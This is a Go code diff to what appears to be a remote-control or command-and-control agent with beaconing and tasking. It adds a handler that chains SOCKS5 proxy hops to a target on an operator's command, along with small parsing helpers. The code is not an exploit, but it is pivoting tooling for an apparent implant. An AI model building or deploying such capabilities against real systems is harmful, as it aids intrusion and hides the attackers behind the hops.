@@ -346,6 +346,12 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			go runGeoIP(conn, sess, g)
+		case proto.TypeProxyChainStart:
+			var pc proto.ProxyChainStart
+			if err := json.Unmarshal(env.Payload, &pc); err != nil {
+				continue
+			}
+			go runProxyChain(conn, sess, pc)
 		case proto.TypeWirelessStop:
 			var ws proto.WirelessStop
 			if err := json.Unmarshal(env.Payload, &ws); err != nil {
@@ -2125,4 +2131,88 @@ func joinStrings(s []string, sep string) string {
 		out += sep + x
 	}
 	return out
+}
+
+// runProxyChain dials a SOCKS5 chain through the hops and reports success.
+func runProxyChain(conn net.Conn, sess *crypto.Session, pc proto.ProxyChainStart) {
+	var hops []recon2.ProxyHop
+	for _, h := range pc.Hops {
+		host, port, err := splitHostPort(h)
+		if err != nil {
+			sendTunnelAck(conn, sess, proto.TypeProxyChainData, proto.ProxyChainData{
+				SessionID: pc.SessionID,
+				Error:     "bad hop " + h + ": " + err.Error(),
+				Done:      true,
+			})
+			return
+		}
+		hops = append(hops, recon2.ProxyHop{Host: host, Port: port})
+	}
+	timeout := time.Duration(pc.Timeout) * time.Second
+	if timeout == 0 {
+		timeout = 15 * time.Second
+	}
+	c, err := recon2.ChainDial(recon2.ChainOptions{
+		Hops:    hops,
+		Timeout: timeout,
+		Target:  pc.Target,
+	})
+	if err != nil {
+		sendTunnelAck(conn, sess, proto.TypeProxyChainData, proto.ProxyChainData{
+			SessionID: pc.SessionID,
+			OK:        false,
+			Error:     err.Error(),
+			Done:      true,
+		})
+		return
+	}
+	defer c.Close()
+	sendTunnelAck(conn, sess, proto.TypeProxyChainData, proto.ProxyChainData{
+		SessionID: pc.SessionID,
+		OK:        true,
+		Detail:    "chain established, " + itoa(len(hops)) + " hops",
+		Done:      true,
+	})
+}
+
+// splitHostPort is a small helper for the proxy chain handler.
+func splitHostPort(s string) (string, int, error) {
+	i := 0
+	for i < len(s) {
+		if s[i] == ':' {
+			break
+		}
+		i++
+	}
+	if i >= len(s) {
+		return "", 0, errors.New("missing port")
+	}
+	host := s[:i]
+	portStr := s[i+1:]
+	port := 0
+	for _, c := range portStr {
+		if c < '0' || c > '9' {
+			return "", 0, errors.New("bad port")
+		}
+		port = port*10 + int(c-'0')
+	}
+	if port == 0 || port > 65535 {
+		return "", 0, errors.New("port out of range")
+	}
+	return host, port, nil
+}
+
+// itoa is a small int-to-string helper for this file.
+func itoa(n int) string {
+	if n == 0 {
+		return "0"
+	}
+	var buf [20]byte
+	i := len(buf)
+	for n > 0 {
+		i--
+		buf[i] = byte('0' + n%10)
+		n /= 10
+	}
+	return string(buf[i:])
 }
